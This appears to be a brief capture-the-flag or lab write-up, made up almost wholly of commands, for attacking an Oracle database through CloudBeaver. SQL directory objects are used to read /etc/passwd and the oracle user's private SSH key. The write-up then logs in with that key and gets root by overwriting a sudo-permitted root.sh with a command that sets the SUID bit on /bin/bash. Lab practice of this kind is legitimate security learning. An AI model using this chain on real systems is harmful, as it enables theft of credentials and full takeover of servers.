Oracle CloudBeaver web-based dbms sql
```sql
--check for what permissions the user has
SELECT * FROM USER_SYS_PRIVS;
--CREATE DIR and DROP DIR or something like that

BEGIN  
EXECUTE IMMEDIATE 'CREATE OR REPLACE DIRECTORY dir_etc AS ''/etc''';  
DBMS_OUTPUT.PUT_LINE(DBMS_XSLPROCESSOR.READ2CLOB('DIR_ETC','passwd'));  
END;
--ceate dir for /etc and read contents of passwd
--we see user oracle

BEGIN  
EXECUTE IMMEDIATE 'CREATE OR REPLACE DIRECTORY dir_etc AS ''/home/oracle/.ssh''';  
DBMS_OUTPUT.PUT_LINE(DBMS_XSLPROCESSOR.READ2CLOB('DIR_ETC','id_rsa'));  
END;
--ceate dir for /home/oracle/.ssh and read contents of id_rsa
```

```zsh
ssh oracle@IP -i id_rsa_oracle
sudo -l 
#/opt/oracle/product/21c/dbhomeXE/root.sh as root
ls -la /opt/oracle/product/21c | grep dbhomeXE
#owned by oracle user
cd /opt/oracle/product/21c/dbhomeXE
rm root.sh

echo "chmod u+s /bin/bash" > root.sh
sudo /opt/oracle/product/21c/dbhomeXE/root.sh
ls -la /bin/bash
bash -p
#root!
```